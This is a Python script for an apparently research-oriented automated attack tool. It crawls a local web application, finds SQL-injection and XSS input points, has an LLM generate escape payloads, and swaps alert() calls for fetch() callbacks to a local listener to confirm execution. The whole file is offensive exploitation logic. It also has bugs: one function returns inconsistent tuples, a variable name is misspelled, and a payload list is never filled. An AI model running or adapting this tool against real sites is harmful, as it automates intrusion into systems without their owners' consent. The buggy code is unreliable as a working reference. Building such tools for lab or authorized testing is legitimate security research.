import random
import re
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
import os
from selenium.webdriver.support.ui import Select
import time
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoAlertPresentException
from selenium.webdriver.common.alert import Alert
from openai import OpenAI
from urllib.parse import urlparse
import argparse  # ← 新增

from browser.driver import get_driver  # 得到一个初始的driver实例
from browser.login import login, check_login  # 登录函数和检查登录状态函数
from browser.navigation import get_all_links  # 递归获取所有链接
from browser.form import get_all_form_inputs  # 获取表单输入点和填充表单的函数

from utils.misc import generate_random_value  # 生成随机值的函数
from utils.xss_reflection import check_xss_reflection  # XSS反射检测函数

from vuln.sql import get_all_sql_inputs  # SQL注入检测函数
from vuln.xss import get_all_xss_inputs  # XSS注入检测函数

from llm.client import get_client, get_ai_response  # LLM客户端
from llm.parse import parse_llm_output

from sql_attack.attack import run_llm_sql_attack  # LLM SQL攻击函数


# 添加命令行参数解析
parser = argparse.ArgumentParser(description="Web automation and SQL log parser")
parser.add_argument('--sql_log_name', required=True, help='Path to the MySQL log file')
args = parser.parse_args()

# 提交的这个逻辑多次用到，可以考虑独立出来
def test_xss_payload(url, form, input_name, payload, trigger_value, reflected_urls):
    """
    测试XSS payload并验证执行结果
    :return: (executed, reflected_pages, contexts)
        executed: payload是否实际执行
        reflected_pages: 反射页面列表
        contexts: 反射上下文列表
    """
    try:
        
        # 导航到目标页面
        driver.get(url)
        check_login(driver)
        driver.get(url)
        
        # 填充表单
        for input_field in form['inputs']:
            name = input_field.get('name')
            ftype = input_field.get('type')
            
            if not name or ftype in ['submit', 'hidden']:
                continue
                
            try:
                elem = driver.find_element(By.NAME, name)
                elem.clear()
                if name == input_name:
                    # 添加验证标记到payload
                    verification_id = generate_random_value(6)
                    # full_payload = payload + f"<script>window.__XSS_VERIFIED = '{verification_id}';</script>"
                    elem.send_keys(payload)
                    print(f"  {name} fill payload + verification: {payload}")
                else:
                    elem.send_keys(generate_random_value(5))
                    print(f"  {name} fill random")
            except Exception as e:
                print(f"  Error filling {name}: {str(e)}")
                continue

        # 提交表单
        submitted = False
        for input_field in form['inputs']:
            if input_field['type'] == 'submit':
                try:
                    if input_field.get('name'):
                        submit_button = driver.find_element(By.NAME, input_field['name'])
                    else:
                        submit_button = driver.find_element(
                            By.XPATH, 
                            "//input[@type='submit'] | //button[@type='submit']"
                        )
                    submit_button.click()
                    submitted = True
                    
                    # 等待页面加载/脚本执行
                    time.sleep(1)
                    break
                except Exception as e:
                    print(f"  Submit error: {str(e)}")
                    continue
 
        if not submitted:
            print(f"  [Warning] Submit failed for form at {url}")
            return False, [], []
        
        # 检查反射情况
        reflected_pages, contexts = check_xss_reflection(driver, trigger_value, reflected_urls)

        executed = False
        with open("xss_verified.txt", 'r') as f:
            for line in f:
                if trigger_value in line:
                    executed = True
                    break
        
        return executed, contexts
        
    except Exception as e:
        print(f"  XSS test error: {str(e)}")
        return False, [], []
    
def convert_to_fetch(payload, trigger_value):
    """
    Convert alert-based XSS payloads to fetch-based payloads
    Args:
        payload: Original payload string (e.g., '</pre><script>alert(123456)</script><pre>')
        trigger_value: The value to send to the server
    Returns:
        Modified payload with fetch call
    """
    # URL-encode the trigger value for safe HTTP transmission
    fetch_url = f'http://127.0.0.1:5000/xss?value={trigger_value}'
    
    # Pattern to match alert() calls with any content between parentheses
    alert_pattern = re.compile(
        r'alert\s*\(([^)]*)\)',  # Matches alert(...) with any content inside
        re.IGNORECASE
    )
    
    # Replacement with fetch call
    modified_payload = alert_pattern.sub(
        f'fetch("{fetch_url}")',
        payload
    )
    
    return modified_payload

def run_llm_xss_attack(input_point):
    """
    对单个XSS输入点运行LLM攻击
    """
    url = input_point['form']['url']
    input_name = input_point['input_name']
    form = input_point['form']
    trigger_value = input_point['trigger_value']
    context = input_point['context']

    # 处理反射页面中的 'self' 值
    reflected_urls = []
    for page in input_point['reflected_pages']:
        if page == 'self':
            reflected_urls.append(url)  # 将 'self' 替换为当前表单的 URL
        else:
            reflected_urls.append(page)

    # 存储攻击结果
    attack_result = {
        'input_point': input_point,
        'context_escape': {
            'success': False,
            'payload': None,
            'tested_payloads': [],
            'contexts': []  # 添加上下文存储
        },
        'behavior_change': {
            'success': False,
            'payload': None,
            'tested_payloads': [],
            'contexts': []  # 添加上下文存储
        }
    }
    
    # ===== 第一阶段: 上下文逃逸 =====
    print(f"\n[Context Escape] Input: {input_name} on {url}")

    if "xss_r" not in url:
        return attack_result

    ce_attempts = 0
    max_ce_attempts = 3
    ce_history = []  # 存储失败的payload和上下文

    while ce_attempts < max_ce_attempts and not attack_result['context_escape']['success']:
        ce_attempts += 1
        print(f"  Attempt {ce_attempts}/{max_ce_attempts}")
        
        # 使用上下文生成prompt
        if not ce_history:
            prompt_template = context_escape_xss
            prompt = prompt_template.format(
                user_input=trigger_value,
                context=context
            )
        else:
            # 只使用最后3条失败记录
            recent_failures = ce_history
            history_str = "\n".join([f"Payload: {p}\nContext: {c}" for p, c in recent_failures])
            
            prompt_template = context_escape_withhistory_xss
            prompt = prompt_template.format(
                user_input=trigger_value,
                context=context,
                history=history_str
            )
        
        # 获取LLM响应
        output = get_ai_response(client, prompt)
        print(output)
        escape_payloads = parse_llm_output(output)
        
        if not escape_payloads:
            print("  No payloads generated by LLM")
            continue
        
        print(f"  Generated {len(escape_payloads)} payloads")
        
        # 测试每个逃逸payload
        for payload in escape_payloads:
            if trigger_value not in payload:
                continue
            
            # 把payload里的alert(内容)改成fetch("http://127.0.0.1:5000/xss?value=trigger value");
            payload = convert_to_fetch(payload,trigger_value)

            # 检查反射并获取上下文
            exexted, contexts = test_xss_payload(url, form, input_name, payload, trigger_value, reflected_urls)
            
            if exexted:
                # 找出包含payload字符最多的上下文
                best_ctx = ""
                max_match_count = 0
                
                for page_contexts in contexts:
                    for ctx in page_contexts:
                        # 计算该上下文包含多少payload中的字符
                        match_count = sum(1 for char in payload if char in ctx)
                        if match_count > max_match_count:
                            max_match_count = match_count
                            best_ctx = ctx
                
                print(f"  [SUCCESS] Payload '{payload}' triggered reflection")
                print(f"         Full context: {best_ctx}")
                attack_result['context_escape']['success'] = True
                attack_result['context_escape']['payload'] = payload
                attack_result['context_escape']['matched_context'] = best_ctx  # 保存实际匹配的上下文
                break
            else:
                # 找出包含payload字符最多的上下文
                best_ctx = ""
                max_match_count = 0
                
                for page_contexts in contexts:
                    for ctx in page_contexts:
                        # 计算该上下文包含多少payload中的字符
                        match_count = sum(1 for char in payload if char in ctx)
                        if match_count > max_match_count:
                            max_match_count = match_count
                            best_ctx = ctx
                
                print(f"  [FAIL] Payload '{payload}' not found in reflection. Best context: '{best_ctx}'")
                
                # 存储失败的payload和最佳上下文
                ce_history.append((payload, best_ctx))
                    

    # 如果上下文逃逸失败，直接返回
    if not attack_result['context_escape']['success']:
        return attack_result

    # XSS的没写行为改变，到时候再设计一下prompt，更稳定一些

    return attack_result

#=====================================================================================================================

# 登录
driver = get_driver(headless=True)
login(driver)

# 获取初始页面的链接和表单
visited_links = get_all_links(driver, "http://127.0.0.1:2222/index.php")

# 获取每个链接的输入点
all_form_inputs = get_all_form_inputs(driver, visited_links)

# 找SQL与XSS注入漏洞可能的输入点
sql_results = get_all_sql_inputs(driver, all_form_inputs, args)
xss_results = get_all_xss_inputs(driver, all_form_inputs, visited_links)

# 初始化LLM客户端
client = get_client()

with open("prompt/sql/context_escape.txt", 'r', encoding='utf-8') as file:
    context_escape = file.read()
with open("prompt/sql/behavior_change.txt", 'r', encoding='utf-8') as file:
    behavior_change = file.read()
with open("prompt/sql/context_escape_withhistory.txt", 'r', encoding='utf-8') as file:
    context_escape_withhistory = file.read()
with open("prompt/sql/behavior_change_withhistory.txt", 'r', encoding='utf-8') as file:
    behavior_change_withhistory = file.read()

with open("prompt/xss/context_escape.txt", 'r', encoding='utf-8') as file:
    context_escape_xss = file.read()
with open("prompt/xss/context_escape_withhistory.txt", 'r', encoding='utf-8') as file:
    context_escape_withhistory_xss = file.read()


# 定义LLM攻击参数
MAX_ATTEMPTS_PER_INPUT = 3  # 每个输入点最多尝试次数
MAX_STEPS_PER_ATTEMPT = 5   # 每次尝试最多步数

# 初始化结果存储
llm_attack_results = []

# 主攻击逻辑
print("\nStarting LLM-based SQL Injection Exploitation...")
for sql_input in sql_results:
    print(f"\n=== Processing Input: {sql_input['input_name']} on {sql_input['form']['url']} ===")

    # 运行LLM攻击
    attack_result = run_llm_sql_attack(input_point=sql_input,
                                       driver=driver,
                                       client=client,
                                       parse_llm_output = parse_llm_output,
                                       args=args,
                                       check_login_func=check_login,
                                       prompt_dir="prompt/sql",
                                       )
    
    if attack_result:
        llm_attack_results.append(attack_result)
        
        # 打印结果摘要
        if attack_result['behavior_change']['success']:
            print(f"[SUCCESS] Full exploit found!")
            print(f"Context Escape Payload: {attack_result['context_escape']['payload']}")
            print(f"Behavior Change Payload: {attack_result['behavior_change']['payload']}")
        elif attack_result['context_escape']['success']:
            print(f"[PARTIAL SUCCESS] Context escape succeeded but behavior change failed")
        else:
            print(f"[FAILURE] Context escape failed")
    else:
        print(f"[ERROR] Failed to run attack on input")

# 打印最终结果
print("\n\n=== LLM Attack Results ===")
for i, result in enumerate(llm_attack_results):
    input_point = result['input_point']
    print(f"\nResult {i+1}:")
    print(f"Input: {input_point['input_name']}")
    print(f"URL: {input_point['form']['url']}")
    print(f"Context Escape: {'SUCCESS' if result['context_escape']['success'] else 'FAIL'}")
    if result['context_escape']['success']:
        print(f"  Payload: {result['context_escape']['payload']}")
    print(f"Behavior Change: {'SUCCESS' if result['behavior_change']['success'] else 'FAIL'}")
    if result['behavior_change']['success']:
        print(f"  Payload: {result['behavior_change']['payload']}")



# 主攻击逻辑
print("\nStarting LLM-based XSS Exploitation...")
llm_xss_attack_results = []

for xss_input in xss_results:
    print(f"\n=== Processing Input: {xss_input['input_name']} on {xss_input['form']['url']} ===")
    
    # 运行LLM XSS攻击
    attack_result = run_llm_xss_attack(xss_input)
    
    if attack_result:
        llm_xss_attack_results.append(attack_result)
        
        # 打印结果摘要
        if attack_result['behavior_change']['success']:
            print(f"[SUCCESS] Full XSS exploit found!")
            print(f"Context Escape Payload: {attack_result['context_escape']['payload']}")
            print(f"Behavior Change Payload: {attack_result['behavior_change']['payload']}")
        elif attack_result['context_escape']['success']:
            print(f"[PARTIAL SUCCESS] Context escape succeeded but behavior change failed")
            print(f"Escaped Payload: {attack_result['context_escape']['payload']}")
        else:
            print(f"[FAILURE] Context escape failed for this input")
    else:
        print(f"[ERROR] Failed to run attack on input")

# 打印最终结果
print("\n\n=== LLM XSS Attack Results ===")
for i, result in enumerate(llm_xss_attack_results):
    input_point = result['input_point']
    print(f"\nResult {i+1}:")
    print(f"Input: {input_point['input_name']}")
    print(f"URL: {input_point['form']['url']}")
    print(f"Context Escape: {'SUCCESS' if result['context_escape']['success'] else 'FAIL'}")
    if result['context_escape']['success']:
        print(f"  Payload: {result['context_escape']['payload']}")
    print(f"Behavior Change: {'SUCCESS' if result['behavior_change']['success'] else 'FAIL'}")
    if result['behavior_change']['success']:
        print(f"  Payload: {result['behavior_change']['payload']}")
    
    # 打印测试过的payload（可选）
    if result['context_escape']['tested_payloads']:
        print(f"\n  Context Escape Tested Payloads:")
        for j, payload in enumerate(result['context_escape']['tested_payloads']):
            print(f"    {j+1}. {payload}")
    
    if result['behavior_change']['tested_payloads']:
        print(f"\n  Behavior Change Tested Payloads:")
        for j, payload in enumerate(result['behavior_change']['tested_payloads']):
            print(f"    {j+1}. {payload}")

# 汇总统计
total_inputs = len(llm_xss_attack_results)
successful_escapes = sum(1 for r in llm_xss_attack_results if r['context_escape']['success'])
successful_exploits = sum(1 for r in llm_xss_attack_results if r['behavior_change']['success'])

print("\n\n=== Summary ===")
print(f"Total Input Points Tested: {total_inputs}")
print(f"Successful Context Escapes: {successful_escapes} ({successful_escapes/total_inputs*100:.1f}%)")
print(f"Successful Full Exploits: {successful_exploits} ({successful_exploits/total_inputs*100:.1f}%)")


driver.quit()